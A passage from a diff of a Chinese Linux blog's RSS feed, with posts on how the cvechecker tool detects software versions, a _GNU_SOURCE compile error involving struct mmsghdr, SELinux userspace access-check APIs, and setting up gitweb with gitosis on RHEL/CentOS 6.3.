type %d\n&amp;quot;, ws-&amp;gt;currentdir, ws-&amp;gt;currentfile, filetype); };&lt;/p>
+&lt;/blockquote>
+&lt;p>原来是通过strings读取二进制程序中的标示，然后通过正则表达式来提取其中的版本信息。系统中的软件多种多样，尽管有默认的编程约定，但不同的开发者肯定会使用不同的声明方式，难免会无法找到或找错版本信息。此外，各个发行版本在发现CVE时往往采用backporting策略，因此即使CVE已经修复，软件包的大版本号也不会发生变化，这也是引起误报的主要原因。 到此，cvechecker已经获取了系统软件包列表以及软件包对应的版本号，将该信息处理成CPE信息，在CVE列表中查找即可。 cvechecker虽然无法准确的查询出当前系统的cve信息，但是很好的解决了不同Linux版本中包管理器差异的问题，底层依赖较少。 cvechecker处理中涉及到众多的映射信息，如程序和软件包的映射表、CVE列表，默认会下载当前所有的CVE信息 ，有510M之多，单纯的文本文件有这么大，可见一斑。cvechecker使用数据库来组织这些映射信息，再用正则表达式进行数据处理，当前支持的数据库有sqlite和mysql。 到此处，cvechecker分析总结完毕，怎么样，是不是也下载下来跑一次呢？ 参考：&lt;/p>
+&lt;ol>
+&lt;li>cve:http://cve.mitre.org/&lt;/li>
+&lt;li>cpe:http://cpe.mitre.org/&lt;/li>
+&lt;li>backporting：https://access.redhat.com/site/security/updates/backporting/&lt;/li>
+&lt;/ol>
+- /posts/cvechecker%e5%ae%9e%e7%8e%b0%e5%88%86%e6%9e%90/ - This is a customized copyright.</description></item><item><title>linux编程中由_GNU_SOURCE未声明所导致的问题</title><link>/posts/linux%e7%bc%96%e7%a8%8b%e4%b8%ad%e7%94%b1_gnu_source%e6%9c%aa%e5%a3%b0%e6%98%8e%e6%89%80%e5%af%bc%e8%87%b4%e7%9a%84%e9%97%ae%e9%a2%98/</link><pubDate>Fri, 21 Feb 2014 08:54:45 +0000</pubDate><guid>/posts/linux%e7%bc%96%e7%a8%8b%e4%b8%ad%e7%94%b1_gnu_source%e6%9c%aa%e5%a3%b0%e6%98%8e%e6%89%80%e5%af%bc%e8%87%b4%e7%9a%84%e9%97%ae%e9%a2%98/</guid><description>seteuid0's blog /posts/linux%e7%bc%96%e7%a8%8b%e4%b8%ad%e7%94%b1_gnu_source%e6%9c%aa%e5%a3%b0%e6%98%8e%e6%89%80%e5%af%bc%e8%87%b4%e7%9a%84%e9%97%ae%e9%a2%98/ -&lt;p>今天在写程序的时候遇到了如下的错误，核对了半天，感觉头文件已经包含，后来发现是缺少了#define _GNU_SOURCE&lt;/p>
+&lt;blockquote>
+&lt;p>gcc example.c -o example example.c: 在函数‘call’中: example.c:58:17: 错误：数组元素的类型不完全 struct mmsghdr msgs[VLEN]; example.c: In function &amp;lsquo;call&amp;rsquo;: example.c:59:17: error: array type has incomplete element type struct mmsghdr msgs[VLEN];&lt;/p>
+&lt;/blockquote>
+&lt;p>查看/usr/include下面的定义发现原因。 由于mmsghdr是recvmmsg所需要的，而recvmmsg只在linux中存在，所以在sys/socket.h中有如下定义：&lt;/p>
+&lt;blockquote>
+&lt;p>#ifdef __USE_GNU /* For `recvmmsg' and `sendmmsg'. */ struct mmsghdr { struct msghdr msg_hdr; /* Actual message header. */ unsigned int msg_len; /* Number of received or sent bytes for the entry. */ }; #endif&lt;/p>
+&lt;/blockquote>
+&lt;p>在features.h文件中可以看到&lt;/p>
+&lt;blockquote>
+&lt;p>#ifdef _GNU_SOURCE # define __USE_GNU 1 #endif&lt;/p>
+&lt;/blockquote>
+&lt;p>这样就可以理解为什么需要添加#define _GNU_SOURCE,之前也有注意到The recvmmsg() system call was added in Linux 2.6.33. Support in glibc was added in version 2.12.但是写程序的时候居然忘记了。 以下截取部分features.h里面的说明内容：&lt;/p>
+&lt;blockquote>
+&lt;p>/* These are defined by the user (or the compiler) to specify the desired environment: __STRICT_ANSI__ ISO Standard C. _ISOC99_SOURCE Extensions to ISO C89 from ISO C99. _ISOC11_SOURCE Extensions to ISO C99 from ISO C11. _POSIX_SOURCE IEEE Std 1003.1. _POSIX_C_SOURCE If ==1, like _POSIX_SOURCE; if &amp;gt;=2 add IEEE Std 1003.2; if &amp;gt;=199309L, add IEEE Std 1003.1b-1993; if &amp;gt;=199506L, add IEEE Std 1003.1c-1995; if &amp;gt;=200112L, all of IEEE 1003.1-2004 if &amp;gt;=200809L, all of IEEE 1003.1-2008 _XOPEN_SOURCE Includes POSIX and XPG things. Set to 500 if Single Unix conformance is wanted, to 600 for the sixth revision, to 700 for the seventh revision. _XOPEN_SOURCE_EXTENDED XPG things and X/Open Unix extensions. _LARGEFILE_SOURCE Some more functions for correct standard I/O. _LARGEFILE64_SOURCE Additional functionality from LFS for large files. _FILE_OFFSET_BITS=N Select default filesystem interface. _BSD_SOURCE ISO C, POSIX, and 4.3BSD things. _SVID_SOURCE ISO C, POSIX, and SVID things. _ATFILE_SOURCE Additional *at interfaces. _GNU_SOURCE All of the above, plus GNU extensions. _REENTRANT Select additionally reentrant object. _THREAD_SAFE Same as _REENTRANT, often used by other systems. _FORTIFY_SOURCE If set to numeric value &amp;gt; 0 additional security measures are defined, according to level. The `-ansi' switch to the GNU C compiler defines __STRICT_ANSI__. If none of these are defined, the default is to have _SVID_SOURCE, _BSD_SOURCE, and _POSIX_SOURCE set to one and _POSIX_C_SOURCE set to 200112L. If more than one of these are defined, they accumulate. For example __STRICT_ANSI__, _POSIX_SOURCE and _POSIX_C_SOURCE together give you ISO C, 1003.1, and 1003.2, but nothing else. These are defined by this file and are used by the header files to decide what to declare or define: __USE_ISOC11 Define ISO C11 things. __USE_ISOC99 Define ISO C99 things. __USE_ISOC95 Define ISO C90 AMD1 (C95) things. __USE_POSIX Define IEEE Std 1003.1 things. __USE_POSIX2 Define IEEE Std 1003.2 things. __USE_POSIX199309 Define IEEE Std 1003.1, and .1b things. __USE_POSIX199506 Define IEEE Std 1003.1, .1b, .1c and .1i things. __USE_XOPEN Define XPG things. __USE_XOPEN_EXTENDED Define X/Open Unix things. __USE_UNIX98 Define Single Unix V2 things. __USE_XOPEN2K Define XPG6 things. __USE_XOPEN2KXSI Define XPG6 XSI things. __USE_XOPEN2K8 Define XPG7 things. __USE_XOPEN2K8XSI Define XPG7 XSI things. __USE_LARGEFILE Define correct standard I/O things. __USE_LARGEFILE64 Define LFS things with separate names. __USE_FILE_OFFSET64 Define 64bit interface as default. __USE_BSD Define 4.3BSD things. __USE_SVID Define SVID things. __USE_MISC Define things common to BSD and System V Unix. __USE_ATFILE Define *at interfaces and AT_* constants for them. __USE_GNU Define GNU extensions. __USE_REENTRANT Define reentrant/thread-safe *_r functions. __USE_FORTIFY_LEVEL Additional security measures used, according to level. __FAVOR_BSD Favor 4.3BSD things in cases of conflict. The macros `__GNU_LIBRARY__', `__GLIBC__', and `__GLIBC_MINOR__' are defined by this file unconditionally. `__GNU_LIBRARY__' is provided only for compatibility. All new code should use the other symbols to test for features. All macros listed above as possibly being defined by this file are explicitly undefined if they are not explicitly defined. Feature-test macros that are not defined by the user or compiler but are implied by the other feature-test macros defined (or by the lack of any definitions) are defined by the file. */ /* If _GNU_SOURCE was defined by the user, turn on all the other features. */ #ifdef _GNU_SOURCE # undef _ISOC95_SOURCE # define _ISOC95_SOURCE 1 # undef _ISOC99_SOURCE # define _ISOC99_SOURCE 1 # undef _ISOC11_SOURCE # define _ISOC11_SOURCE 1 # undef _POSIX_SOURCE # define _POSIX_SOURCE 1 # undef _POSIX_C_SOURCE # define _POSIX_C_SOURCE 200809L # undef _XOPEN_SOURCE # define _XOPEN_SOURCE 700 # undef _XOPEN_SOURCE_EXTENDED # define _XOPEN_SOURCE_EXTENDED 1 # undef _LARGEFILE64_SOURCE # define _LARGEFILE64_SOURCE 1 # undef _BSD_SOURCE # define _BSD_SOURCE 1 # undef _SVID_SOURCE # define _SVID_SOURCE 1 # undef _ATFILE_SOURCE # define _ATFILE_SOURCE 1 #endif&lt;/p>
+&lt;/blockquote>
+- /posts/linux%e7%bc%96%e7%a8%8b%e4%b8%ad%e7%94%b1_gnu_source%e6%9c%aa%e5%a3%b0%e6%98%8e%e6%89%80%e5%af%bc%e8%87%b4%e7%9a%84%e9%97%ae%e9%a2%98/ - This is a customized copyright.</description></item><item><title>SELinux中核外应用查询策略API总结</title><link>/posts/selinux%e4%b8%ad%e6%a0%b8%e5%a4%96%e5%ba%94%e7%94%a8%e6%9f%a5%e8%af%a2%e7%ad%96%e7%95%a5api%e6%80%bb%e7%bb%93/</link><pubDate>Wed, 19 Feb 2014 15:23:31 +0000</pubDate><guid>/posts/selinux%e4%b8%ad%e6%a0%b8%e5%a4%96%e5%ba%94%e7%94%a8%e6%9f%a5%e8%af%a2%e7%ad%96%e7%95%a5api%e6%80%bb%e7%bb%93/</guid><description>seteuid0's blog /posts/selinux%e4%b8%ad%e6%a0%b8%e5%a4%96%e5%ba%94%e7%94%a8%e6%9f%a5%e8%af%a2%e7%ad%96%e7%95%a5api%e6%80%bb%e7%bb%93/ -&lt;p>SELinux中支持应用使用libselinux库来针对SELinux进行安全扩展（selinux aware application)，这样应用就可以使用SELinux的策略库来实现内部的访问控制，当前的passwd、dbus、udev等都使用selinux进行了扩展。其中passwd使用selinux进行密码修改检查，dbus对收、发进行了权限检查，分成了：acquire_svc和send_msg。 SELinux提供给用户空间的用户计算策略是否允许的接口主要有2类：selinux_check_access和avc_has_perm，下面对这两类接口进行说明。 selinux_check_access的函数原型为：&lt;/p>
+&lt;blockquote>
+&lt;p>int selinux_check_access(const security_context_t scon, const security_context_t tcon, const char *class, const char *perm, void *audit‐ data);&lt;/p>
+&lt;/blockquote>
+&lt;p>需要输入的为主体、客体、客体类、权限集的字符串表示。 avc_has_perm的函数原型为：&lt;/p>
+&lt;blockquote>
+&lt;p>int avc_has_perm(security_id_t ssid, security_id_t tsid, security_class_t tclass, access_vector_t requested, struct avc_entry_ref *aeref, void *auditdata);&lt;/p>
+&lt;/blockquote>
+&lt;p>需要输入的为主体、客体、客体类、权限集对应的id号，因此需要在使用以前将安全上下文与id号进行映射。在/usr/include/selinux/flask.h和/usr/include/selinux/av_permissions.h对客体类和权限集进行了定义，但是如果使用头文件中的编号，就导致应用与默认的refpolicy的编号顺序必须保持一致，否则容易导致编号与实际内容产生冲突。SELinux的开发者创建了selinux_set_mapping函数来动态建立客体类和权限集的映射关系。&lt;/p>
+&lt;blockquote>
+&lt;p>int selinux_set_mapping(struct  security_class_mapping *map); struct security_class_mapping { const char *name; const char *perms[]; };&lt;/p>
+&lt;/blockquote>
+&lt;p>例如：&lt;/p>
+&lt;blockquote>
+&lt;p>static struct security_class_mapping dbus_map[] = { { &amp;ldquo;dbus&amp;rdquo;, { &amp;ldquo;acquire_svc&amp;rdquo;, &amp;ldquo;send_msg&amp;rdquo;, NULL } }, { NULL } }; #define DBUS__ACQUIRE_SVC 1 #define DBUS__SEND_MSG 2&lt;/p>
+&lt;/blockquote>
+&lt;p>通过定义类似如上的内容将客体类和权限集在核外进行动态的映射，这样就可以放心的使用类似“DBUS__ACQUIRE_SVC“的宏定义了。 细心的读者可能还会发现avc_has_perm是对avc信息进行处理，所在调用avc_has_perm之前还需要初始化avc相关信息。需要调用avc_open和avc_entry_ref_init等进行初始化。 当使用selinux_check_access的时候就不需要对avc进行初始化操作，因为在selinux_check_access里面进行了调用，实现如下：&lt;/p>
+&lt;blockquote>
+&lt;p>int selinux_check_access(const security_context_t scon, const security_context_t tcon, const char *class, const char *perm, void *aux) { int rc; security_id_t scon_id; security_id_t tcon_id; security_class_t sclass; access_vector_t av; if (is_selinux_enabled() == 0) return 0; __selinux_once(once, avc_init_once); rc = avc_context_to_sid(scon, &amp;amp;scon_id); if (rc &amp;lt; 0) return rc; rc = avc_context_to_sid(tcon, &amp;amp;tcon_id); if (rc &amp;lt; 0) return rc; sclass = string_to_security_class(class); if (sclass == 0) { rc = errno; if (security_deny_unknown() == 0) return 0; errno = rc; return -1; } av = string_to_av_perm(sclass, perm); if (av == 0) { rc = errno; if (security_deny_unknown() == 0) return 0; errno = rc; return -1; } return avc_has_perm (scon_id, tcon_id, sclass, av, NULL, aux); }&lt;/p>
+&lt;/blockquote>
+&lt;p>其中__selinux_once中对avc_init_once进行调用，avc_init_once对avc_open进行调用，即完成了对avc的初始化。里面调用avc_init丢netlink进行初始化，使核外可以获知selinux状态信息，audit等信息。 除此以外，API中还有security_compute_av函数，该函数的原型为：&lt;/p>
+&lt;blockquote>
+&lt;p>int security_compute_av(security_context_t scon, security_context_t tcon, security_class_t tclass, access_vector_t requested, struct av_decision *avd);&lt;/p>
+&lt;/blockquote>
+&lt;p>该函数对策略信息是否允许进行查询，但并不对avc进行处理，avc_has_perm里面就是调用了security_compute_av获取策略信息。   示例代码： &lt;a href="http://linuxsec.net/wp-content/uploads/2014/02/avc_has_perm_example.c">avc_has_perm_example&lt;/a>&lt;/p>
+- /posts/selinux%e4%b8%ad%e6%a0%b8%e5%a4%96%e5%ba%94%e7%94%a8%e6%9f%a5%e8%af%a2%e7%ad%96%e7%95%a5api%e6%80%bb%e7%bb%93/ - This is a customized copyright.</description></item><item><title>[zz]redhat/centos 6.3 搭建git/gitosis/gitweb详细过程</title><link>/posts/zzredhatcentos-6-3-%e6%90%ad%e5%bb%bagitgitosisgitweb%e8%af%a6%e7%bb%86%e8%bf%87%e7%a8%8b/</link><pubDate>Thu, 13 Feb 2014 00:53:51 +0000</pubDate><guid>/posts/zzredhatcentos-6-3-%e6%90%ad%e5%bb%bagitgitosisgitweb%e8%af%a6%e7%bb%86%e8%bf%87%e7%a8%8b/</guid><description>seteuid0's blog /posts/zzredhatcentos-6-3-%e6%90%ad%e5%bb%bagitgitosisgitweb%e8%af%a6%e7%bb%86%e8%bf%87%e7%a8%8b/ -&lt;p>1. gitweb安装&lt;/p>
+&lt;p>    注意：redhat的iso源是没有gitweb安装包，但是centos的源中有，在上一篇文章中给出了如何让redhat使用centos的源，那么，只需采用如下命令即可安装。&lt;/p>
+&lt;ol>
+&lt;li># yum install gitweb&lt;/li>
+&lt;/ol>
+&lt;p>2. gitweb配置&lt;/p>
+&lt;p>  gitweb默认安装到了/var/www/git下，其配置文件在/etc/gitweb.conf下，另外，httpd的配置文件/etc/httpd/conf.d/git.conf。&lt;/p>
+&lt;p>（1）修改/etc/gitweb.conf&lt;/p>
+&lt;ol>
+&lt;li>$projectroot = &amp;ldquo;/var/www/git&amp;rdquo; //将projectroot修改为/var/www/git&lt;/li>
+&lt;/ol>
+&lt;p>(2)修改/etc/httpd/conf.d/git.conf&lt;/p>
+&lt;ol>
+&lt;li>Alias /git /var/www/git&lt;/li>
+&lt;li>&amp;lt;Directory /var/www/git&amp;gt;&lt;/li>
+&lt;li>Allow from all&lt;/li>
+&lt;li>AllowOverride all&lt;/li>
+&lt;li>Order allow,deny&lt;/li>
+&lt;li>Options +ExecCGI&lt;/li>
+&lt;li>AddHandler cgi-script .cgi&lt;/li>
+&lt;li>DirectoryIndex gitweb.cgi&lt;/li>
+&lt;li>SetEnv GITWEB_CONFIG /etc/gitweb.conf&lt;/li>
+&lt;li>Dav On&lt;/li>
+&lt;li>RewriteEngine Off&lt;/li>
+&lt;li>
+&lt;!-- raw HTML omitted -->
+&lt;/li>
+&lt;/ol>
+&lt;p>（3）重启httpd&lt;/p>
+&lt;ol>
+&lt;li>/etc/init.d/httpd restart&lt;/li>
+&lt;/ol>
+&lt;p>（4）将gitosis仓库连接到/var/www/git下，完成web显示&lt;/p>
+&lt;ol>
+&lt;li>ln -s /home/git/repositories/test_repo.git /var/www/git/&lt;/li>
+&lt;/ol>
+&lt;p>(5)通过浏览器浏览&lt;/p>
+&lt;p>http://xxxx/git/&lt;/p>
+&lt;p>注意：  如果git clone  http://xxx/git/test_repo.git时出现git update-server-info错误，则在test_repos.git目录下执行 git update-server-info 命令即可(gitosis服务器的相应仓库下)。&lt;/p>
+&lt;p>3. 创建新的git repository&lt;/p>
+&lt;p>在git server的/home/git/repository目录下，执行如下命令：&lt;/p>
+&lt;ol>
+&lt;li>mkdir test.git&lt;/li>
+&lt;li>cd test.git&lt;/li>
+&lt;li>git init &amp;ndash;bare&lt;/li>
+&lt;li>//可以在这里添加源文件，也可以在client端clone之后添加&lt;/li>
+&lt;/ol>
+- /posts/zzredhatcentos-6-3-%e6%90%ad%e5%bb%bagitgitosisgitweb%e8%af%a6%e7%bb%86%e8%bf%87%e7%a8%8b/ - This is a customized copyright.</description></item></channel></rss>
